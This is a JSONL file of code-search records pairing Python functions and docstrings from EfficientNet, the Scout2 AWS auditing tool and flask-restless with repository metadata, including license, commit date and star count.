{"docstring": "\"\"\" EfficientNet-Lite3 \"\"\"\n", "func_signal": "def efficientnet_lite3(pretrained=False, **kwargs):\n", "code": "model = _gen_efficientnet_lite(\n    'efficientnet_lite3', channel_multiplier=1.2, depth_multiplier=1.4, pretrained=pretrained, **kwargs)\nreturn model", "path": "gen-efficientnet-pytorch/geffnet/gen_efficientnet.py", "commit_date": "2020-09-07 00:00:00", "repo_name": "rwightman/gen-efficientnet-pytorch", "stars": 1559, "license": "apache-2.0", "language": "python", "size": 200}
{"docstring": "\"\"\"\nParse a single CloudWatch trail\n\n:param global_params:           Parameters shared for all regions\n:param region:                  Name of the AWS region\n:param alarm:                   Alarm\n\"\"\"\n", "func_signal": "def parse_alarm(self, global_params, region, alarm):\n", "code": "alarm['arn'] = alarm.pop('AlarmArn')\nalarm['name'] = alarm.pop('AlarmName')\n# Drop some data\nfor k in ['AlarmConfigurationUpdatedTimestamp', 'StateReason', 'StateReasonData', 'StateUpdatedTimestamp']:\n    foo = alarm.pop(k) if k in alarm else None\nalarm_id = self.get_non_aws_id(alarm['arn'])\nself.alarms[alarm_id] = alarm", "path": "Scout2/AWSScout2/services/cloudwatch.py", "commit_date": "2017-10-03 00:00:00", "repo_name": "nccgroup/Scout2", "stars": 1727, "license": "gpl-2.0", "language": "python", "size": 3191}
{"docstring": "\"\"\"\nParse a single identity and fetch additional attributes\n\n:param global_params:           Parameters shared for all regions\n:param region:                  Name of the AWS region\n\"\"\"\n", "func_signal": "def parse_identitie(self, global_params, region, identity_name):\n", "code": "identity = {'name': identity_name, 'policies': {}}\npolicy_names = api_clients[region].list_identity_policies(Identity = identity_name)['PolicyNames']\nif len(policy_names):\n    policies = api_clients[region].get_identity_policies(Identity = identity_name, PolicyNames = policy_names)['Policies']\n    for policy_name in policies:\n        identity['policies'][policy_name] = json.loads(policies[policy_name])\ndkim = api_clients[region].get_identity_dkim_attributes(Identities = [ identity_name ])['DkimAttributes'][identity_name]\nidentity['DkimEnabled'] = dkim['DkimEnabled']\nidentity['DkimVerificationStatus'] = dkim['DkimVerificationStatus']\nself.identities[self.get_non_aws_id(identity_name)] = identity", "path": "Scout2/AWSScout2/services/ses.py", "commit_date": "2017-10-03 00:00:00", "repo_name": "nccgroup/Scout2", "stars": 1727, "license": "gpl-2.0", "language": "python", "size": 3191}
{"docstring": "\"\"\"\nPrepare listall output template\n\n:param format_file:\n:param format_item_dir:\n:param format:\n:param config:\n:param option_prefix:\n:param template:\n:param skip_options:\n:return:\n\"\"\"\n# Set the list of keys if printing from a file spec\n# _LINE_(whatever)_EOL_\n# _ITEM_(resource)_METI_\n# _KEY_(path_to_value)\n", "func_signal": "def format_listall_output(format_file, format_item_dir, format, rule, option_prefix = None, template = None, skip_options = False):\n", "code": "if format_file and os.path.isfile(format_file):\n    if not template:\n        with open(format_file, 'rt') as f:\n            template = f.read()\n    # Optional files\n    if not skip_options:\n        re_option = re.compile(r'(%_OPTION_\\((.*?)\\)_NOITPO_)')\n        optional_files = re_option.findall(template)\n        for optional_file in optional_files:\n            if optional_file[1].startswith(option_prefix + '-'):\n                with open(os.path.join(format_item_dir, optional_file[1].strip()), 'rt') as f:\n                    template = template.replace(optional_file[0].strip(), f.read())\n    # Include files if needed\n    re_file = re.compile(r'(_FILE_\\((.*?)\\)_ELIF_)')\n    while True:\n        requested_files = re_file.findall(template)\n        available_files = os.listdir(format_item_dir) if format_item_dir else []\n        for requested_file in requested_files:\n            if requested_file[1].strip() in available_files:\n                with open(os.path.join(format_item_dir, requested_file[1].strip()), 'rt') as f:\n                    template = template.replace(requested_file[0].strip(), f.read())\n        # Find items and keys to be printed\n        re_line = re.compile(r'(_ITEM_\\((.*?)\\)_METI_)')\n        re_key = re.compile(r'_KEY_\\(*(.*?)\\)', re.DOTALL|re.MULTILINE) # Remove the multiline ?\n        lines = re_line.findall(template)\n        for (i, line) in enumerate(lines):\n            lines[i] = line + (re_key.findall(line[1]),)\n        requested_files = re_file.findall(template)\n        if len(requested_files) == 0:\n            break\nelif format and format[0] == 'csv':\n    keys = rule.keys\n    line = ', '.join('_KEY_(%s)' % k for k in keys)\n    lines = [ (line, line, keys) ]\n    template = line\nreturn (lines, template)", "path": "Scout2/AWSScout2/output/console.py", "commit_date": "2017-12-02 00:00:00", "repo_name": "nccgroup/Scout2", "stars": 1727, "license": "gpl-2.0", "language": "python", "size": 3191}
{"docstring": "\"\"\"\n\n:param credentials:\n:param services:\n:param regions:\n:param partition_name:\n:return:\n\"\"\"\n", "func_signal": "def fetch(self, credentials, services = [], regions = [], partition_name = ''):\n", "code": "for service in vars(self):\n    try:\n        if services != [] and service not in services:\n            continue\n        service_config = getattr(self, service)\n        if 'fetch_all' in dir(service_config):\n            method_args = {}\n            method_args['credentials'] = credentials\n            if service != 'iam':\n                method_args['regions'] = regions\n                method_args['partition_name'] = partition_name\n            service_config.fetch_all(**method_args)\n            if hasattr(service_config, 'finalize'):\n                service_config.finalize()\n    except Exception as e:\n        printError('Error: could not fetch %s configuration.' % service)\n        printException(e)", "path": "Scout2/AWSScout2/configs/services.py", "commit_date": "2017-11-13 00:00:00", "repo_name": "nccgroup/Scout2", "stars": 1727, "license": "gpl-2.0", "language": "python", "size": 3191}
{"docstring": "\"\"\"\nDetermines whether the exception is due to API throttling.\n\n:param e:                           Exception raised\n:return:                            True if it's a throttling exception else False\n\"\"\"\n", "func_signal": "def is_throttled(e):\n", "code": "return True if (hasattr(e, 'response') and\n                e.response is not None and\n                'Error' in e.response and\n                e.response['Error']['Code'] in ['Throttling', 'RequestLimitExceeded', 'ThrottlingException']) else \\\n    False", "path": "Scout2/AWSScout2/utils.py", "commit_date": "2018-07-23 00:00:00", "repo_name": "nccgroup/Scout2", "stars": 1727, "license": "gpl-2.0", "language": "python", "size": 3191}
{"docstring": "\"\"\"\nConverts CamelCase to camel_case\n\n:param name:\n:return:\n\"\"\"\n", "func_signal": "def no_camel(name):\n", "code": "s1 = re.sub('(.)([A-Z][a-z]+)', r'\\1_\\2', name)\nreturn re.sub('([a-z0-9])([A-Z])', r'\\1_\\2', s1).lower()", "path": "Scout2/AWSScout2/utils.py", "commit_date": "2018-07-23 00:00:00", "repo_name": "nccgroup/Scout2", "stars": 1727, "license": "gpl-2.0", "language": "python", "size": 3191}
{"docstring": "\"\"\"\nConfirm before overwriting existing files. Do not prompt if the file does not exist or force_write is set\n\n:param filename:                    Name of the file to be overwritten\n:param force_write:                 Do not ask for confirmation and automatically return True if set\n:return:                            :boolean\n\"\"\"\n#\n", "func_signal": "def prompt_4_overwrite(filename, force_write):\n", "code": "if not os.path.exists(filename) or force_write:\n    return True\nreturn prompt_4_yes_no('File \\'{}\\' already exists. Do you want to overwrite it'.format(filename))", "path": "Scout2/AWSScout2/output/utils.py", "commit_date": "2017-04-24 00:00:00", "repo_name": "nccgroup/Scout2", "stars": 1727, "license": "gpl-2.0", "language": "python", "size": 3191}
{"docstring": "\"\"\"\nAsk a question and prompt for yes or no\n\n:param question:                    Question to ask; answer is yes/no\n:return:                            :boolean\n\"\"\"\n", "func_signal": "def prompt_4_yes_no(question):\n", "code": "while True:\n    sys.stdout.write(question + ' (y/n)? ')\n    try:\n        choice = raw_input().lower()\n    except:\n        choice = input().lower()\n    if choice == 'yes' or choice == 'y':\n        return True\n    elif choice == 'no' or choice == 'n':\n        return False\n    else:\n        printError('\\'%s\\' is not a valid answer. Enter \\'yes\\'(y) or \\'no\\'(n).' % choice)", "path": "Scout2/AWSScout2/output/utils.py", "commit_date": "2017-04-24 00:00:00", "repo_name": "nccgroup/Scout2", "stars": 1727, "license": "gpl-2.0", "language": "python", "size": 3191}
{"docstring": "\"\"\"\nParse a single EMR cluster\n\n:param global_params:           Parameters shared for all regions\n:param region:                  Name of the AWS region\n:param cluster:                 EMR cluster\n\"\"\"\n", "func_signal": "def parse_cluster(self, global_params, region, cluster):\n", "code": "cluster_id = cluster['Id']\ncluster = api_clients[region].describe_cluster(ClusterId = cluster_id)['Cluster']\ncluster['id'] = cluster.pop('Id')\ncluster['name'] = cluster.pop('Name')\nvpc_id = 'TODO' # The EMR API won't disclose the VPC ID, so wait until all configs have been fetch and look up the VPC based on the subnet ID\nmanage_dictionary(self.vpcs, vpc_id, VPCConfig(self.vpc_resource_types))\nself.vpcs[vpc_id].clusters[cluster_id] = cluster", "path": "Scout2/AWSScout2/services/emr.py", "commit_date": "2017-10-03 00:00:00", "repo_name": "nccgroup/Scout2", "stars": 1727, "license": "gpl-2.0", "language": "python", "size": 3191}
{"docstring": "\"\"\"\nParse a single subscription and reference it in its corresponding topic\n\n:param params:                  Global parameters (defaults to {})\n:param subscription:            SNS Subscription\n\"\"\"\n", "func_signal": "def parse_subscription(self, params, region, subscription):\n", "code": "topic_arn = subscription.pop('TopicArn')\ntopic_name = topic_arn.split(':')[-1]\nif topic_name in self.topics:\n    topic = self.topics[topic_name]\n    manage_dictionary(topic['subscriptions'], 'protocol', {})\n    protocol = subscription.pop('Protocol')\n    manage_dictionary(topic['subscriptions']['protocol'], protocol, [])\n    topic['subscriptions']['protocol'][protocol].append(subscription)\n    topic['subscriptions_count'] += 1", "path": "Scout2/AWSScout2/services/sns.py", "commit_date": "2017-10-03 00:00:00", "repo_name": "nccgroup/Scout2", "stars": 1727, "license": "gpl-2.0", "language": "python", "size": 3191}
{"docstring": "\"\"\"\n\n:param config_filename:\n:param force_write:\n:param quiet:\n:return:\n\"\"\"\n", "func_signal": "def __open_file(self, config_filename, force_write, quiet=False):\n", "code": "if not quiet:\n    printInfo('Saving config...')\nif prompt_4_overwrite(config_filename, force_write):\n    try:\n        config_dirname = os.path.dirname(config_filename)\n        if not os.path.isdir(config_dirname):\n            os.makedirs(config_dirname)\n        return open(config_filename, 'wt')\n    except Exception as e:\n        printException(e)\nelse:\n    return None", "path": "Scout2/AWSScout2/output/js.py", "commit_date": "2017-09-29 00:00:00", "repo_name": "nccgroup/Scout2", "stars": 1727, "license": "gpl-2.0", "language": "python", "size": 3191}
{"docstring": "\"\"\"\nUpdate every attribute of the rule by setting the argument values as necessary\n\n:param parameterized_input:\n:param arg_values:\n:param convert:\n:return:\n\"\"\"\n", "func_signal": "def set_definition(self, rule_definitions, attributes = [], ip_ranges = [], params = {}):\n", "code": "string_definition = rule_definitions[self.filename].string_definition\n# Load condition dependencies\ndefinition = json.loads(string_definition)\ndefinition['conditions'] += self.conditions\nloaded_conditions = []\nfor condition in definition['conditions']:\n    if condition[0].startswith('_INCLUDE_('):\n        include = re.findall(r'_INCLUDE_\\((.*?)\\)', condition[0])[0]\n        #new_conditions = load_data(include, key_name = 'conditions')\n        with open(os.path.join(os.path.dirname(os.path.realpath(__file__)), 'data/%s' % include), 'rt') as f:\n            new_conditions = f.read()\n            for (i, value) in enumerate(condition[1]):\n                new_conditions = re.sub(condition[1][i], condition[2][i], new_conditions)\n            new_conditions = json.loads(new_conditions)['conditions']\n        loaded_conditions.append(new_conditions)\n    else:\n        loaded_conditions.append(condition)\ndefinition['conditions'] = loaded_conditions\nstring_definition = json.dumps(definition)\n# Set parameters\nparameters = re.findall(r'(_ARG_([a-zA-Z0-9]+)_)', string_definition)\nfor param in parameters:\n    index = int(param[1])\n    if len(self.args) <= index:\n        string_definition = string_definition.replace(param[0], '')\n    elif type(self.args[index]) == list:\n        value = '[ %s ]' % ', '.join('\"%s\"' % v for v in self.args[index])\n        string_definition = string_definition.replace('\"%s\"' % param[0], value)\n    else:\n        string_definition = string_definition.replace(param[0], self.args[index])\n# Strip dots if necessary\nstripdots = re_strip_dots.findall(string_definition)\nfor value in stripdots:\n    string_definition = string_definition.replace(value[0], value[1].replace('.', ''))\ndefinition = json.loads(string_definition)\n# Set special values (IP ranges, AWS account ID, ...)\nfor condition in definition['conditions']:\n    if type(condition) != list or len(condition) == 1 or type(condition[2]) == list:\n        continue\n    for testcase in testcases:\n        result = testcase['regex'].match(condition[2])\n        if result and (testcase['name'] == 'ip_ranges_from_file' or testcase['name'] == 'ip_ranges_from_local_file'):\n            filename = result.groups()[0]\n            conditions = result.groups()[1] if len(result.groups()) > 1 else []\n            # TODO :: handle comma here...\n            if filename == ip_ranges_from_args:\n                prefixes = []\n                for filename in ip_ranges:\n                    prefixes += read_ip_ranges(filename, local_file = True, ip_only = True, conditions = conditions)\n                condition[2] = prefixes\n                break\n            else:\n                local_file = True if testcase['name'] == 'ip_ranges_from_local_file' else False\n                condition[2] = read_ip_ranges(filename, local_file = local_file, ip_only = True, conditions = conditions)\n                break\n            break\n        elif result:\n            condition[2] = params[testcase['name']]\n            break\n\nif len(attributes) == 0:\n    attributes = [attr for attr in definition]\nfor attr in attributes:\n    if attr in definition:\n        setattr(self, attr, definition[attr])\nif hasattr(self, 'path'):\n    self.service = format_service_name(self.path.split('.')[0])\nif not hasattr(self, 'key'):\n    setattr(self, 'key', self.filename)\nsetattr(self, 'key', self.key.replace('.json', ''))\nif self.key_suffix:\n    setattr(self, 'key', '%s-%s' % (self.key, self.key_suffix))", "path": "Scout2/AWSScout2/rules/rule.py", "commit_date": "2017-12-14 00:00:00", "repo_name": "nccgroup/Scout2", "stars": 1727, "license": "gpl-2.0", "language": "python", "size": 3191}
{"docstring": "# Init queue and threads\n", "func_signal": "def _init_threading(self, function, params={}, num_threads=10):\n", "code": "q = Queue(maxsize=0) # TODO: find something appropriate\nif not num_threads:\n    num_threads = len(targets)\nfor i in range(num_threads):\n    worker = Thread(target=function, args=(q, params))\n    worker.setDaemon(True)\n    worker.start()\nreturn q", "path": "Scout2/AWSScout2/configs/base.py", "commit_date": "2017-12-06 00:00:00", "repo_name": "nccgroup/Scout2", "stars": 1727, "license": "gpl-2.0", "language": "python", "size": 3191}
{"docstring": "\"\"\"\nParse a single connection and fetch additional attributes\n\n:param global_params:           Parameters shared for all regions\n:param region:                  Name of the AWS region\n:param connection_url:               URL of the AWS connection\n\"\"\"\n", "func_signal": "def parse_connection(self, global_params, region, connection):\n", "code": "connection['id'] = connection.pop('connectionId')\nconnection['name'] = connection.pop('connectionName')\nself.connections[connection['id']] = connection", "path": "Scout2/AWSScout2/services/directconnect.py", "commit_date": "2017-10-03 00:00:00", "repo_name": "nccgroup/Scout2", "stars": 1727, "license": "gpl-2.0", "language": "python", "size": 3191}
{"docstring": "# self.metadata = {}\n", "func_signal": "def __init__(self, profile, report_dir=None, timestamp=None):\n", "code": "self.report_dir = report_dir if report_dir else DEFAULT_REPORT_DIR\nself.profile = profile.replace('/', '_').replace('\\\\', '_')  # Issue 111\nself.current_time = datetime.datetime.now(dateutil.tz.tzlocal())\nif timestamp != False:\n    self.timestamp = self.current_time.strftime(\"%Y-%m-%d_%Hh%M%z\") if not timestamp else timestamp", "path": "Scout2/AWSScout2/output/js.py", "commit_date": "2017-09-29 00:00:00", "repo_name": "nccgroup/Scout2", "stars": 1727, "license": "gpl-2.0", "language": "python", "size": 3191}
{"docstring": "\"\"\"\nNot all AWS resources have an ID and some services allow the use of \".\" in names, which break's Scout2's\nrecursion scheme if name is used as an ID. Use SHA1(name) instead.\n\n:param name:                    Name of the resource to\n:return:                        SHA1(name)\n\"\"\"\n", "func_signal": "def get_non_aws_id(self, name):\n", "code": "m = sha1()\nm.update(name.encode('utf-8'))\nreturn m.hexdigest()", "path": "Scout2/AWSScout2/configs/base.py", "commit_date": "2017-12-06 00:00:00", "repo_name": "nccgroup/Scout2", "stars": 1727, "license": "gpl-2.0", "language": "python", "size": 3191}
{"docstring": "\"\"\"\nParse a single topic and fetch additional attributes\n\n:param params:                  Global parameters (defaults to {})\n:param topic:                   SNS Topic\n\"\"\"\n", "func_signal": "def parse_topic(self, params, region, topic):\n", "code": "topic['arn'] = topic.pop('TopicArn')\ntopic['name'] = topic['arn'].split(':')[-1]\n(prefix, partition, service, region, account, name) = topic['arn'].split(':')\napi_client = api_clients[region]\nattributes = api_client.get_topic_attributes(TopicArn=topic['arn'])['Attributes']\nfor k in ['Owner', 'DisplayName']:\n    topic[k] = attributes[k] if k in attributes else None\nfor k in ['Policy', 'DeliveryPolicy', 'EffectiveDeliveryPolicy']:\n    topic[k] = json.loads(attributes[k]) if k in attributes else None\ntopic['name'] = topic['arn'].split(':')[-1]\nmanage_dictionary(topic, 'subscriptions', {})\nmanage_dictionary(topic, 'subscriptions_count', 0)\nself.topics[topic['name']] = topic", "path": "Scout2/AWSScout2/services/sns.py", "commit_date": "2017-10-03 00:00:00", "repo_name": "nccgroup/Scout2", "stars": 1727, "license": "gpl-2.0", "language": "python", "size": 3191}
{"docstring": "\"\"\"\nCopies the value of keys from source object to dest object\n\n:param src:\n:param dst:\n:param keys:\n:return:\n\"\"\"\n", "func_signal": "def get_keys(src, dst, keys):\n", "code": "for key in keys:\n    #dst[no_camel(key)] = src[key] if key in src else None\n    dst[key] = src[key] if key in src else None", "path": "Scout2/AWSScout2/utils.py", "commit_date": "2018-07-23 00:00:00", "repo_name": "nccgroup/Scout2", "stars": 1727, "license": "gpl-2.0", "language": "python", "size": 3191}
{"docstring": "\"\"\"\nGeneric fetching function that iterates through all of the service's targets\n\n:param credentials:             F\n:param service:                 Name of the service\n:param regions:                 Name of regions to fetch data from\n:param partition_name:          AWS partition to connect to\n:param targets:                 Type of resources to be fetched; defaults to all.\n\n\"\"\"\n", "func_signal": "def fetch_all(self, credentials, regions = [], partition_name = 'aws', targets = None):\n", "code": "global status, formatted_string\n# Initialize targets\nif not targets:\n    targets = type(self).targets\nprintInfo('Fetching %s config...' % format_service_name(self.service))\nformatted_string = None\napi_service = self.service.lower()\n# Connect to the service\nif self.service in [ 's3' ]: # S3 namespace is global but APIs aren't....\n    api_clients = {}\n    for region in build_region_list(self.service, regions, partition_name):\n        api_clients[region] = connect_service('s3', credentials, region, silent = True)\n    api_client = api_clients[list(api_clients.keys())[0]]\nelif self.service == 'route53domains':\n    api_client = connect_service(self.service, credentials, 'us-east-1', silent = True) # TODO: use partition's default region\nelse:\n    api_client = connect_service(self.service, credentials, silent = True)\n# Threading to fetch & parse resources (queue consumer)\nparams = {'api_client': api_client}\nif self.service in ['s3']:\n    params['api_clients'] = api_clients\nq = self._init_threading(self.__fetch_target, params, self.thread_config['parse'])\n# Threading to list resources (queue feeder)\nparams = {'api_client': api_client, 'q': q}\nif self.service in ['s3']:\n    params['api_clients'] = api_clients\nqt = self._init_threading(self.__fetch_service, params, self.thread_config['list'])\n# Init display\nself.fetchstatuslogger = FetchStatusLogger(targets)\n# Go\nfor target in targets:\n    qt.put(target)\n# Join\nqt.join()\nq.join()\n# Show completion and force newline\nif self.service != 'iam':\n    self.fetchstatuslogger.show(True)", "path": "Scout2/AWSScout2/configs/base.py", "commit_date": "2017-12-06 00:00:00", "repo_name": "nccgroup/Scout2", "stars": 1727, "license": "gpl-2.0", "language": "python", "size": 3191}
{"docstring": "\"\"\"\nFormat and print the output of ListAll\n\n:param lines:\n:param resources:\n:param aws_config:\n:param template:\n:param arguments:\n:param nodup:\n:return:\n\"\"\"\n", "func_signal": "def generate_listall_output(lines, resources, aws_config, template, arguments, nodup = False):\n", "code": "for line in lines:\n    output = []\n    for resource in resources:\n        current_path = resource.split('.')\n        outline = line[1]\n        for key in line[2]:\n            outline = outline.replace('_KEY_('+key+')', get_value_at(aws_config['services'], current_path, key, True))\n        output.append(outline)\n    output = '\\n'.join(line for line in sorted(set(output)))\n    template = template.replace(line[0], output)\nfor (i, argument) in enumerate(arguments):\n    template = template.replace('_ARG_%d_' % i, argument)\nreturn template", "path": "Scout2/AWSScout2/output/console.py", "commit_date": "2017-12-02 00:00:00", "repo_name": "nccgroup/Scout2", "stars": 1727, "license": "gpl-2.0", "language": "python", "size": 3191}
{"docstring": "\"\"\"Tests for deleting a resource.\"\"\"\n", "func_signal": "def test_delete(self):\n", "code": "person = self.Person(id=1)\nself.session.add(person)\nself.session.commit()\nresponse = self.app.delete('/api/person/1')\nassert response.status_code == 204\nassert self.Person.query.count() == 0", "path": "flask-restless/tests/test_deleting.py", "commit_date": "2016-06-09 00:00:00", "repo_name": "jfinkels/flask-restless", "stars": 1025, "license": "agpl-3.0", "language": "python", "size": 3705}
{"docstring": "\"\"\"Tests that attempting to delete from a related resource URL (instead\nof a relationship URL) yields an error response.\n\n\"\"\"\n", "func_signal": "def test_related_resource_url(self):\n", "code": "article = self.Article(id=1)\nself.session.add(article)\nself.session.commit()\nresponse = self.app.delete('/api/article/1/author')\nassert response.status_code == 405\n# TODO check error message here", "path": "flask-restless/tests/test_deleting.py", "commit_date": "2016-06-09 00:00:00", "repo_name": "jfinkels/flask-restless", "stars": 1025, "license": "agpl-3.0", "language": "python", "size": 3705}
{"docstring": "\"\"\"Tests for running a preprocessor on a request to delete a\nsingle resource.\n\n\"\"\"\n", "func_signal": "def test_resource(self):\n", "code": "person = self.Person(id=1)\nself.session.add(person)\nself.session.commit()\n\ndata = {'triggered': False}\n\ndef update_data(*args, **kw):\n    data['triggered'] = True\n\npreprocessors = {'DELETE_RESOURCE': [update_data]}\nself.manager.create_api(self.Person, methods=['DELETE'],\n                        preprocessors=preprocessors)\nself.app.delete('/api/person/1')\nassert data['triggered']", "path": "flask-restless/tests/test_deleting.py", "commit_date": "2016-06-09 00:00:00", "repo_name": "jfinkels/flask-restless", "stars": 1025, "license": "agpl-3.0", "language": "python", "size": 3705}
{"docstring": "\"\"\"Tests that if a client specifies only :http:header:`Accept`\nheaders with non-JSON API media types, then the server responds\nwith a :http:status:`406`.\n\n\"\"\"\n", "func_signal": "def test_wrong_accept_header(self):\n", "code": "person = self.Person(id=1)\nself.session.add(person)\nself.session.commit()\nheaders = {'Accept': 'application/json'}\nresponse = self.app.delete('/api/person/1', headers=headers)\nassert response.status_code == 406\nassert self.session.query(self.Person).all() == [person]", "path": "flask-restless/tests/test_deleting.py", "commit_date": "2016-06-09 00:00:00", "repo_name": "jfinkels/flask-restless", "stars": 1025, "license": "agpl-3.0", "language": "python", "size": 3705}
{"docstring": "\"\"\"Tests that :http:method:`delete` requests to a related resource URL\nare forbidden.\n\n\"\"\"\n", "func_signal": "def test_related_resource_url_forbidden(self):\n", "code": "article = self.Article(id=1)\nperson = self.Person(id=1)\narticle.author = person\nself.session.add_all([article, person])\nself.session.commit()\ndata = dict(data=dict(type='person', id=1))\nresponse = self.app.delete('/api/article/1/author', data=dumps(data))\nassert response.status_code == 405\n# TODO check error message here\nassert article.author is person", "path": "flask-restless/tests/test_deleting.py", "commit_date": "2016-06-09 00:00:00", "repo_name": "jfinkels/flask-restless", "stars": 1025, "license": "agpl-3.0", "language": "python", "size": 3705}
{"docstring": "\"\"\"Tests for compatibility with Microsoft Internet Explorer 8.\n\nAccording to issue #267, making requests using JavaScript from MSIE8\ndoes not allow changing the content type of the request (it is always\n``text/html``). Therefore Flask-Restless should ignore the content type\nwhen a request is coming from this client.\n\n\"\"\"\n", "func_signal": "def test_msie8(self):\n", "code": "person = self.Person(id=1)\nself.session.add(person)\nself.session.commit()\nheaders = {'User-Agent': MSIE8_UA}\ncontent_type = 'text/html'\nresponse = self.app.delete('/api/person/1', headers=headers,\n                           content_type=content_type)\nassert response.status_code == 204", "path": "flask-restless/tests/test_deleting.py", "commit_date": "2016-06-09 00:00:00", "repo_name": "jfinkels/flask-restless", "stars": 1025, "license": "agpl-3.0", "language": "python", "size": 3705}
{"docstring": "\"\"\"Updates the attributes and relationships of the specified instance\naccording to the elements in the `data` dictionary.\n\n`instance` must be an instance of the SQLAlchemy model class specified\nin the constructor of this class.\n\n`data` must be a dictionary representation of a resource object as\ndescribed in the `Updating Resources`_ section of the JSON API\nspecification.\n\n`resource_id` is the ID of the `instance` as determined from the\nURL, given as a string. This is passed directly from the\n:meth:`patch` method.\n\n.. _Updating Resources: http://jsonapi.org/format/#crud-updating\n\n\"\"\"\n# Update any relationships.\n", "func_signal": "def _update_instance(self, instance, data, resource_id):\n", "code": "links = data.pop('relationships', {})\nfor linkname, link in links.items():\n    if not isinstance(link, dict):\n        detail = ('missing relationship object for \"{0}\" in resource'\n                  ' of type \"{1}\" with ID \"{2}\"')\n        detail = detail.format(linkname, self.collection_name,\n                               resource_id)\n        return error_response(400, detail=detail)\n    # The client is obligated by JSON API to provide linkage if\n    # the `links` attribute exists.\n    if 'data' not in link:\n        detail = 'relationship \"{0}\" is missing resource linkage'\n        detail = detail.format(linkname)\n        return error_response(400, detail=detail)\n    linkage = link['data']\n    related_model = get_related_model(self.model, linkname)\n    # If this is a to-many relationship, get all the related\n    # resources.\n    if is_like_list(instance, linkname):\n        # Replacement of a to-many relationship may have been disabled\n        # by the user.\n        if not self.allow_to_many_replacement:\n            detail = 'Not allowed to replace a to-many relationship'\n            return error_response(403, detail=detail)\n        # The provided data must be a list for a to-many relationship.\n        if not isinstance(linkage, list):\n            detail = ('\"data\" element for the to-many relationship'\n                      ' \"{0}\" on the instance of \"{1}\" with ID \"{2}\"'\n                      ' must be a list; maybe you intended to provide'\n                      ' an empty list?')\n            detail = detail.format(linkname, self.collection_name,\n                                   resource_id)\n            return error_response(400, detail=detail)\n        # If this is left empty, the relationship will be zeroed.\n        newvalue = []\n        not_found = []\n        for rel in linkage:\n            expected_type = collection_name(related_model)\n            type_ = rel['type']\n            if type_ != expected_type:\n                detail = 'Type must be {0}, not {1}'\n                detail = detail.format(expected_type, type_)\n                return error_response(409, detail=detail)\n            id_ = rel['id']\n            inst = get_by(self.session, related_model, id_)\n            if inst is None:\n                not_found.append((id_, type_))\n            else:\n                newvalue.append(inst)\n        # If any of the requested to-many linkage objects do not exist,\n        # return an error response.\n        if not_found:\n            detail = 'No resource of type {0} found with ID {1}'\n            errors = [error(detail=detail.format(t, i))\n                      for t, i in not_found]\n            return errors_response(404, errors)\n    # Otherwise, it is a to-one relationship, so just get the single\n    # related resource.\n    else:\n        # If the client provided \"null\" for this relation,\n        # remove it by setting the attribute to ``None``.\n        if linkage is None:\n            newvalue = None\n        else:\n            expected_type = collection_name(related_model)\n            type_ = linkage['type']\n            if type_ != expected_type:\n                detail = 'Type must be {0}, not {1}'\n                detail = detail.format(expected_type, type_)\n                return error_response(409, detail=detail)\n            id_ = linkage['id']\n            inst = get_by(self.session, related_model, id_)\n            # If the to-one relationship resource does not\n            # exist, return an error response.\n            if inst is None:\n                detail = 'No resource of type {0} found with ID {1}'\n                detail = detail.format(type_, id_)\n                return error_response(404, detail=detail)\n            newvalue = inst\n    # Set the new value of the relationship.\n    try:\n        # TODO Here if there are any extra attributes in\n        # newvalue[inst], (1) get the secondary association object for\n        # that relation, then (2) set the extra attributes on that\n        # object.\n        setattr(instance, linkname, newvalue)\n    except self.validation_exceptions as exception:\n        return self._handle_validation_exception(exception)\n\n# Now consider only the attributes to update.\ndata = data.pop('attributes', {})\n# Check for any request parameter naming a column which does not exist\n# on the current model.\nfor field in data:\n    if not has_field(self.model, field):\n        detail = \"Model does not have field '{0}'\".format(field)\n        return error_response(400, detail=detail)\n# Special case: if there are any dates, convert the string form of the\n# date into an instance of the Python ``datetime`` object.\ndata = dict((k, string_to_datetime(self.model, k, v))\n            for k, v in data.items())\n# Finally, update each attribute individually.\ntry:\n    if data:\n        for field, value in data.items():\n            setattr(instance, field, value)\n    # Flush all changes to database but do not commit the transaction\n    # so that postprocessors have the chance to roll it back\n    self.session.flush()\nexcept self.validation_exceptions as exception:\n    return self._handle_validation_exception(exception)", "path": "flask-restless/flask_restless/views/resources.py", "commit_date": "2017-03-25 00:00:00", "repo_name": "jfinkels/flask-restless", "stars": 1025, "license": "agpl-3.0", "language": "python", "size": 3705}
{"docstring": "\"\"\"Returns a response containing a collection of resources of the type\nspecified by the ``model`` argument to the constructor of this class.\n\nFor example, a request like::\n\n    GET /people\n\nwill fetch a collection of people resources.\n\nIn general, this method is called on requests of the form::\n\n    GET /<collection_name>\n\nFiltering, sorting, grouping, and pagination are applied to the\nresponse in this method.\n\n\"\"\"\n", "func_signal": "def _get_collection(self):\n", "code": "try:\n    filters, sort, group_by, single, ignorecase = \\\n        self.collection_parameters()\nexcept (TypeError, ValueError, OverflowError) as exception:\n    detail = 'Unable to decode filter objects as JSON list'\n    return error_response(400, cause=exception, detail=detail)\nexcept SingleKeyError as exception:\n    detail = 'Invalid format for filter[single] query parameter'\n    return error_response(400, cause=exception, detail=detail)\n\nfor preprocessor in self.preprocessors['GET_COLLECTION']:\n    preprocessor(filters=filters, sort=sort, group_by=group_by,\n                 single=single)\n\nreturn self._get_collection_helper(filters=filters, sort=sort,\n                                   group_by=group_by, single=single,\n                                   ignorecase=ignorecase)", "path": "flask-restless/flask_restless/views/resources.py", "commit_date": "2017-03-25 00:00:00", "repo_name": "jfinkels/flask-restless", "stars": 1025, "license": "agpl-3.0", "language": "python", "size": 3705}
{"docstring": "\"\"\"Tests that a request to delete a nonexistent resource yields a\n:http:status:`404 response.\n\n\"\"\"\n", "func_signal": "def test_nonexistent_instance(self):\n", "code": "response = self.app.delete('/api/person/1')\nassert response.status_code == 404", "path": "flask-restless/tests/test_deleting.py", "commit_date": "2016-06-09 00:00:00", "repo_name": "jfinkels/flask-restless", "stars": 1025, "license": "agpl-3.0", "language": "python", "size": 3705}
